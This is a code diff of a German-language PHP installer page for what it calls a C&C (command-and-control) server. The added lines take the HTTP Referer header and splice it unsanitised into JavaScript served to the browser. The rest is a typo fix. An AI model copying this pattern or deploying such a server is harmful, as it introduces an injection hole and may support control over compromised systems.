@@ -79,6 +79,10 @@
                   die("Unexpected Response Code: ${http_code}: ${response_body}");
                 }
                 curl_close($process);
+                //Aufbereiten des JS Codes und einfügen des neuen Server´s
+                $tmp = explode("[fill_in_server]",$response_body);
+                $server_ip = $_SERVER["HTTP_REFERER"];
+                $response_body = $tmp[0] . $server_ip . $tmp[1];
                 echo $response_body;
                 exit;
             }else{
@@ -137,7 +141,7 @@
         <p>Vorraussetzungen f&uuml;r eine Reibungslose installation ist eine stabile Internetverbindung.</p>
         <br />
         <p>Bitte beachte das f&uuml;r die Installation der Server von Github verwendet wird. Lies dir bitte die 
-        Datenschutzerkl&auml;rung von Github durch. Dies wird gemacht das Installationen immer auf den neusten Datein basieren 
+        Datenschutzerkl&auml;rung von Github durch. Dies wird gemacht das Installationen immer auf den neusten Dateien basieren 
         und immer die neuste Version verwendet wird.</p>
         <p>Gerade wurde alle geforderten Datein f&uuml;r den C&amp;C-Server heruntergeladen.</p>
         <button id="button" onclick="start_install()">OK, Installation auf diesen Server starten!</button>
